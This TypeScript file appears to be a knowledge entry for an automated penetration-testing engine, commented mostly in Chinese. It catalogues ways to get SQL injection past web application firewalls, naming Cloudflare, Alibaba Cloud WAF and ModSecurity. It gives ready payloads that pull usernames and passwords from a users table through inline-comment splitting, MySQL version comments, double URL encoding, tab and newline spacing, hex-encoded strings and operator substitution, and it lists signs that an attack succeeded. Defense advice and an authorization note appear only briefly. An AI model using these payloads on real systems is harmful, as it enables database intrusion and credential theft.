/**
 * HOS-Sec-Engine V2 - SQL Injection WAF Bypass Skills
 * SQL 注入 WAF 绕过专项 Skill 集合
 */

import { AttackDefenseSkill, DEFAULT_SKILL_RUNTIME } from '../../../types/skill';

export const sqliWafBypassSkills: AttackDefenseSkill[] = [
  {
    metadata: {
      id: 'web-sqli-001',
      name: 'SQL Injection WAF Bypass Techniques',
      category: 'web',
      subCategory: 'sql-injection',
      riskLevel: 'critical',
      confidence: 0.92,
      updatedAt: '2026-06',
      author: 'HOS-Sec-Engine',
      tags: ['sqli', 'waf-bypass', 'injection', 'filter-evasion', 'sql-payload'],
    },
    trigger: {
      scenarios: [
        '目标存在 SQL 注入点但常规 payload 被 WAF 拦截返回 403',
        'URL 参数或 POST Body 中的 SQL 关键字被过滤或编码',
        '使用 Cloudflare、阿里云 WAF、ModSecurity 等主流 WAF 防护的系统',
        '对 UNION SELECT、OR 1=1、单引号等经典 payload 触发拦截规则',
      ],
      keywords: [
        'sql注入',
        'sql injection',
        'waf',
        '绕过',
        '403 Forbidden',
        'blocked by WAF',
        'ModSecurity',
        'sql injection detected',
        'security firewall',
        '请求被拦截',
        '安全策略拦截',
        'sqli',
        'injection bypass',
      ],
      aliases: [
        'waf bypass',
        'filter evasion',
        'sql injection bypass',
        'payload obfuscation',
        '编码绕过',
        '注释符绕过',
        '安全狗',
        '云锁',
        '阿里云waf',
        'cloudflare',
      ],
      indicators: [
        '403',
        'blocked',
        'forbidden',
        'request rejected',
        'security violation',
      ],
    },
    knowledge: {
      description:
        'SQL 注入 WAF 绕过技术用于在目标系统部署 Web 应用防火墙 (WAF) 时，通过编码、混淆、分块、协议层差异等手段绕过关键字检测和模式匹配规则，成功执行 SQL 注入攻击。主流 WAF 多基于正则匹配和关键字黑名单，通过理解 WAF 规则实现方式和 SQL 语法的灵活性，可构造等效但形式不同的 payload 绕过检测。',
      symptoms: [
        '常规 SQL 注入 payload（如 \' OR 1=1 --）触发 403 响应',
        'WAF 拦截日志显示检测到 SQL 注入特征',
        '参数值中的 SQL 关键字被 URL 解码后仍被拦截',
        '大小写变换、简单编码仍被检测',
      ],
      rootCauses: [
        'WAF 规则基于正则表达式匹配关键字，无法覆盖所有 SQL 语法等价形式',
        'WAF 在 URL 解码、编码处理上与应用服务器存在差异（双重编码、Unicode 编码）',
        'WAF 对 HTTP 协议层处理（分块传输、HTTP 参数污染）与后端解析不一致',
        '部分 WAF 只检测 URL 和 POST body，忽略 Cookie、User-Agent 等其他注入点',
        'WAF 规则集存在覆盖盲区，如对特殊注释符、内联注释、Hex/Unicode 编码的检测不完整',
      ],
      observations: [
        'Cloudflare 对内联注释 /* */ 的检测较弱，但对 UNION SELECT 检测严格',
        '阿里云 WAF 对 URL 编码后的 SQL 关键字仍能解码检测，但双重编码可绕过部分规则',
        'ModSecurity CRS 3.x 对编码变体的覆盖率较高，但协议层绕过（HTTP 走私、分块）依然有效',
        '部分 WAF 只检测前 N 个字符或限制检测深度，超长 payload 可能截断绕过',
        'MySQL 支持 /*!50000...*/ 版本条件注释执行代码，可绕过关键字检测',
      ],
      commonMistakes: [
        '仅做简单大小写变换（如 uNiOn SeLeCt），现代 WAF 均已覆盖',
        '使用单层 URL 编码，多数 WAF 会自动解码后检测',
        '忽略 WAF 和应用服务器的编码处理差异，payload 编码后在应用层无法正确解析',
        '未识别 WAF 类型就盲目尝试绕过技术，应先知 WAF 类型再针对性绕过',
        '过度依赖工具自动生成的 payload，缺乏对绕过原理的理解',
      ],
      notes: [
        'WAF 绕过技术需要结合具体 WAF 产品、版本和规则集进行针对性测试',
        '部分绕过技术可能因 WAF 规则更新而失效，需保持技术更新',
        'WAF 绕过测试应在授权范围内进行，避免触发安全告警影响业务',
        '现代 WAF 逐渐引入 ML 和行为分析，纯关键字绕过的成功率在下降',
      ],
    },
    action: {
      checklist: [
        '识别 WAF 类型（通过响应头、拦截页面特征、错误信息等）',
        '确定 SQL 注入类型（UNION-based、Blind、Error-based、Time-based）',
        '分析被拦截的具体关键字或模式',
        '尝试编码绕过（URL 编码、双重编码、Unicode 编码、Hex 编码）',
        '尝试注释符绕过（内联注释、版本条件注释、特殊注释符）',
        '尝试大小写+注释混合绕过',
        '尝试分块传输或 HTTP 参数污染',
        '尝试替代语法（如 HAVING 替代 WHERE、GROUP BY 替代 ORDER BY）',
        '验证 payload 在应用层是否正常解析执行',
      ],
      techniques: [
        '内联注释绕过：U/**/NION/**/SEL/**/ECT',
        '版本条件注释：/*!50000UNION*/ /*!50000SELECT*/',
        '双重 URL 编码：%2527 替代 \'，%2520 替代空格',
        'Unicode 编码：使用 %u0027 等 Unicode 转义（IIS 特有）',
        'Hex 编码字符串：0x75736572 替代 \'user\'',
        '空白符替代：用 %09（Tab）、%0a（换行）、%0d（回车）替代空格',
        '运算符替代：用 XOR、&& 替代 OR/AND',
        '函数名混淆：CONCAT 替代字符串连接，SUBSTRING 替代 SUBSTR',
        'HTTP 参数污染：id=1&id=2 利用后端解析差异',
        '分块传输编码 (Chunked)：分割 payload 避免模式匹配',
      ],
      examples: [
        {
          name: '内联注释绕过 UNION SELECT',
          description: '利用 SQL 内联注释分割关键字，绕过 WAF 对 UNION SELECT 的完整匹配',
          content:
            "原始 payload: ' UNION SELECT username,password FROM users--\n" +
            "绕过 payload: ' U/**/NION/**/SEL/**/ECT username,password FR/**/OM users--\n" +
            "原理: WAF 正则通常匹配完整的 'UNION SELECT' 模式，内联注释 /* */ 在 SQL 中被忽略但不影响关键字完整性\n" +
            "适用: 适用于大多数基于正则匹配的 WAF，如 Cloudflare、ModSecurity",
        },
        {
          name: '版本条件注释绕过',
          description: '利用 MySQL 版本条件注释 /*!50000...*/ 执行代码，同时绕过 WAF 检测',
          content:
            "原始 payload: ' AND 1=1 UNION SELECT 1,2,3--\n" +
            "绕过 payload: ' /*!50000AND*/ 1=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--\n" +
            "或: ' AND/*!50000 1=1*/ /*!50000UNION*//*!50000SELECT*/ 1,2,3--\n" +
            "原理: MySQL 会执行 /*!版本号 代码*/ 中的内容，WAF 不认为这是完整的 SQL 关键字\n" +
            "适用: MySQL 5.0+，对 ModSecurity CRS 和部分云 WAF 有效",
        },
        {
          name: '双重 URL 编码绕过',
          description: '对特殊字符进行双重 URL 编码，利用 WAF 和应用层解码次数差异',
          content:
            "原始 payload: ' OR 1=1--\n" +
            "绕过 payload: %2527%2520OR%25201%253D1--\n" +
            "原理: 第一次解码 %25 → %, %27 → ', 如果 WAF 只解码一次得到 ' OR 1=1--\n" +
            "     但某些架构中 WAF 只解码一次后检测，而应用层再次解码得到原始 payload\n" +
            "     实际测试中更有效的是: %2527 用于绕过对 ' 的检测\n" +
            "适用: 适用于 WAF 和应用层解码链不一致的场景",
        },
        {
          name: '空白符变体绕过空格检测',
          description: '使用非标准空白字符替代空格，绕过对空格的检测规则',
          content:
            "原始 payload: ' UNION SELECT username FROM users--\n" +
            "绕过 payload: '%09UNION%09SELECT%09username%09FROM%09users--\n" +
            "或: '%0aUNION%0aSELECT%0ausername%0aFROM%0ausers--\n" +
            "或: '/*!UNION*//*!SELECT*/username/*!FROM*/users--\n" +
            "原理: SQL 中 Tab(%09)、换行(%0a)、回车(%0d) 均可作为分隔符\n" +
            "     WAF 规则可能只匹配空格(0x20)作为关键字分隔符\n" +
            "适用: 适用于对空白符检测不严格的 WAF",
        },
        {
          name: 'Hex 编码字符串绕过引号检测',
          description: '使用十六进制编码替代字符串字面量，绕过对单引号的检测',
          content:
            "原始 payload: ' UNION SELECT username,password FROM users WHERE username='admin'--\n" +
            "绕过 payload: ' UNION SELECT username,password FROM users WHERE username=0x61646d696e--\n" +
            "原理: MySQL 中 0x61646d696e 会被解析为字符串 'admin'\n" +
            "     避免使用引号绕过 WAF 对引号的检测\n" +
            "     也可用 CHAR() 函数: CHAR(97,100,109,105,110) = 'admin'\n" +
            "适用: 适用于 WAF 对引号进行严格检测的场景",
        },
        {
          name: '运算符替代绕过关键字检测',
          description: '使用逻辑运算符的等价形式替代 OR/AND，绕过关键字黑名单',
          content:
            "原始 payload: ' OR 1=1--\n" +
            "绕过 payload (XOR): ' XOR 1=1--\n" +
            "绕过 payload (||): ' || 1=1--\n" +
            "绕过 payload (BETWEEN): ' WHERE 1 BETWEEN 0 AND 1--\n" +
            "绕过 payload (IN): ' WHERE 1 IN (1,2,3)--\n" +
            "原理: OR 1=1 的等价形式在 SQL 中有多种表达\n" +
            "     WAF 通常只检测 OR/AND，对 XOR、||、BETWEEN 等检测较弱\n" +
            "适用: 适用于只检测 OR/AND 关键字的 WAF",
        },
      ],
    },
    validation: {
      indicators: [
        'HTTP 响应状态码从 403 变为 200',
        '响应内容包含数据库错误信息（说明 SQL 被执行）',
        'Blind SQLi 中真/假条件返回不同页面内容',
        'Time-based SQLi 中 SLEEP/BENCHMARK 导致响应时间延迟',
        '响应中包含预期数据（如用户名、版本号等）',
      ],
      successSigns: [
        '403 拦截消失，请求正常到达应用层',
        '数据库错误信息暴露（如 MySQL error、syntax error near）',
        '页面内容随注入条件变化（True/False 响应不同）',
        '延时注入中响应时间明显变化',
        '成功提取数据库结构信息（表名、列名）',
      ],
      falsePositiveSigns: [
        'WAF 规则更新后原 payload 被重新拦截',
        '响应内容变化由其他因素导致（如缓存、会话状态）',
        '数据库错误信息为静态页面内容而非真实错误',
        '延时由网络波动导致而非 SQL 延时函数执行',
      ],
    },
    defense: {
      recommendations: [
        '使用参数化查询 (Prepared Statements)，从根本上消除 SQL 注入',
        'WAF 规则应覆盖编码变体（URL 编码、Hex、Unicode、双重编码）',
        '在 WAF 中配置多层解码检测，确保与应用层解码链一致',
        '启用 WAF 的正则表达式深度匹配，而非仅关键字匹配',
        '结合行为分析和 ML 模型，检测异常 SQL 查询模式',
        '对所有输入点进行统一的安全过滤和编码',
        '最小化数据库用户权限，限制 SQL 注入的影响范围',
      ],
      mitigations: [
        '定期更新 WAF 规则库，覆盖最新绕过技术',
        '实施 Web 应用安全开发生命周期 (SDL)，在代码层面消除注入点',
        '使用 ORM 框架替代原始 SQL 拼接',
        '启用数据库审计日志，监控异常 SQL 查询',
        '对 API 接口实施严格的输入验证和类型检查',
      ],
      references: [
        'https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF',
        'https://portswigger.net/web-security/sql-injection',
        'https://modsecurity.org/CRS/Documentation/',
        'https://github.com/sqlmapproject/sqlmap/wiki/Usage',
      ],
    },
    quality: {
      confidence: 0.92,
      reviewed: true,
      tested: true,
      lastVerified: '2026-06',
    },
    playbooks: ['web-pentest-full'],
    phase: 'exploitation',
    enabled: true,
    runtime: {
      requiresAgent: false,
      agentCount: 1,
      parallelizable: true,
      requiresNetwork: true,
      requiresSandbox: false,
      dependencies: [],
      estimatedTokens: 3000,
    },
  },
];
